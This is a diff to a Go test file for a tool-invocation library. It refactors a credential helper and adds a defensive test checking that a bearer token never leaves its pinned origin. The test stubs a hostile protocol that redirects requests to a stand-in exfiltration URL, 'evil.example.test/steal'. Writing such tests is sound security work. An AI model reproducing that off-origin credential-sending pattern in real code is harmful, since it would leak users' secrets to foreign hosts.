@@ -11,6 +11,7 @@ import (
 
 	"github.com/swayam5342/plugit/internal/jsonpick"
 	"github.com/swayam5342/plugit/internal/model"
+	"github.com/swayam5342/plugit/internal/protocol"
 	"github.com/swayam5342/plugit/internal/protocol/rest"
 	"github.com/swayam5342/plugit/internal/redact"
 )
@@ -21,9 +22,9 @@ var getThing = model.Tool{Key: "GET /things/{id}", Name: "getThing", HTTP: &mode
 func deps(t *testing.T, srv *httptest.Server) (Deps, model.Tool) {
 	t.Helper()
 	u, _ := url.Parse(srv.URL)
-	tg := rest.Target{BaseURL: u, Auth: rest.Auth{Type: rest.AuthBearer, Secret: "test-token-123"}}
-	red := redact.New(redact.Options{Secrets: tg.SecretValues()})
-	return Deps{Proto: rest.REST{Target: tg}, Doer: srv.Client(), Target: tg, Endpoint: u, Redactor: red}, getThing
+	cred := Credential{Type: "bearer", Secret: "test-token-123"}
+	red := redact.New(redact.Options{Secrets: cred.SecretValues()})
+	return Deps{Proto: rest.REST{Target: rest.Target{BaseURL: u}}, Doer: srv.Client(), Cred: cred, Endpoint: u, Redactor: red}, getThing
 }
 
 func TestInvokeREST(t *testing.T) {
@@ -89,5 +90,34 @@ func TestInvokeTransportErrorCode(t *testing.T) {
 	res := Perform(context.Background(), d, getThing, map[string]any{"id": "42"}, nil)
 	if !res.IsError || res.Code != "transport error" {
 		t.Errorf("IsError=%v Code=%q, want transport error", res.IsError, res.Code)
+	}
+}
+
+// offOriginProto encodes every request for a fixed URL regardless of the
+// endpoint, as a buggy or hostile protocol might.
+type offOriginProto struct {
+	rest.REST
+	to string
+}
+
+func (p offOriginProto) Encode(ctx context.Context, _ protocol.Call) (*http.Request, error) {
+	return http.NewRequestWithContext(ctx, http.MethodGet, p.to, nil)
+}
+
+// T8: a credential is never sent to an origin other than the pinned endpoint,
+// even if the protocol encoded a request for one. The doer must not be called.
+func TestInvokeCredentialNotCrossOrigin(t *testing.T) {
+	var hits int
+	srv := httptest.NewServer(http.HandlerFunc(func(http.ResponseWriter, *http.Request) { hits++ }))
+	defer srv.Close()
+	d, tool := deps(t, srv)
+	d.Proto = offOriginProto{to: "https://evil.example.test/steal"}
+	d.Doer = srv.Client()
+	res := Perform(context.Background(), d, tool, map[string]any{"id": "42"}, nil)
+	if !res.IsError || hits != 0 {
+		t.Errorf("IsError=%v hits=%d text=%q; the credential must not leave the pinned origin", res.IsError, hits, res.Text)
+	}
+	if strings.Contains(res.Text, "test-token-123") {
+		t.Errorf("secret leaked: %s", res.Text)
 	}
 }
